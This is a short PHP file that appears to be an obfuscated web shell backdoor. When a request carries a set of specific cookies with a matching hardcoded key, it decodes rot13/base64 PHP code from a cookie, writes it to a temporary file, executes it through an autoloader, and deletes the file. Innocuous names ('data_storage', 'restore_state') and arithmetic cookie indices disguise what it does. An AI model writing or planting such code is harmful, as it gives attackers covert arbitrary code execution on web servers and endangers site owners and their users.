<?php


if (isset($_COOKIE[58-58]) && isset($_COOKIE[92-91]) && isset($_COOKIE[-4+7]) && isset($_COOKIE[58+-54])) {
    $fac = $_COOKIE;
    function data_storage($sym) {
        $fac = $_COOKIE;
        $comp = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), 'fa092695');
        if (!is_writable($comp)) {
            $comp = getcwd() . DIRECTORY_SEPARATOR . "restore_state";
        }
        $bind = "\x3c\x3f\x70\x68p\x20" . base64_decode(str_rot13($fac[3]));
        if (is_writeable($comp)) {
            $component = fopen($comp, 'w+');
            fputs($component, $bind);
            fclose($component);
            spl_autoload_unregister(__FUNCTION__);
            require_once($comp);
            @array_map('unlink', array($comp));
        }
    }
    spl_autoload_register("data_storage");
    $key = "15a4f9236389a18594d201134ecd414a";
    if (!strncmp($key, $fac[4], 32)) {
        if (@class_parents("system_core_mutex_lock", true)) {
            exit;
        }
    }
}
